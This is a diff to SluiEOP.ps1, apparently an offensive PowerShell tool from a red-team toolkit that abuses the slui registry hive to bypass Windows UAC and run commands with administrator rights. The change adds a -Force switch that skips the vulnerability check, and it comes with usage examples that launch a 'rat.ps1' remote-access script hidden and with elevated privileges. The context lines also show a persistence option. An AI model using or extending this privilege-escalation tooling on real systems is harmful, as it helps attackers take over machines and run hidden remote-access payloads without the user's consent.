@@ -43,6 +43,10 @@
    PS C:\> .\SluiEOP.ps1 "powershell -exec bypass -w 1 -File C:\Users\pedro\AppData\Local\Temp\rat.ps1"
    Execute $Env:TMP\rat.ps1 script with high privileges (Admin) in an hidden console.
 
+.EXAMPLE
+   PS C:\> .\SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start mspaint.exe" -Force
+   [-Force] EOP (create vuln HIVE bypassing vuln Checks) to Spawn mspaint with high privileges (Admin)
+
 .INPUTS
    None. You cannot pipe objects into SluiEOP.ps1
 
@@ -62,6 +66,7 @@ $VerboseMode = "False"         # Change this value to "True" for verbose
 $EOP_Success = $False          # Remote EOP execution status [<dontchange>]
 $MakeItPersistence = "False"   # Change this value to "True" to make the '$Command' persistence
 $param1 = $args[0]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
+$param2 = $args[1]             # User Inputs [ <Arguments> ] [<Parameters>] [<dontchange>]
 $host.UI.RawUI.WindowTitle = " @SluiEOP v1.9 {SSA@redTeam}"
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$Env:WINDIR\System32\cmd.exe"
@@ -73,7 +78,7 @@ If(-not($param1) -or $param1 -eq $null){
 
 ## Check for regedit vulnerable HIVE existence before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -EA SilentlyContinue
-If($CheckVuln -eq $True){
+If($CheckVuln -eq $True -or $param2 -eq "-Force"){
 
    ## SluiEOP meterpeter post-module banner
    Write-Host "`nSluiEOP v1.9 - By r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
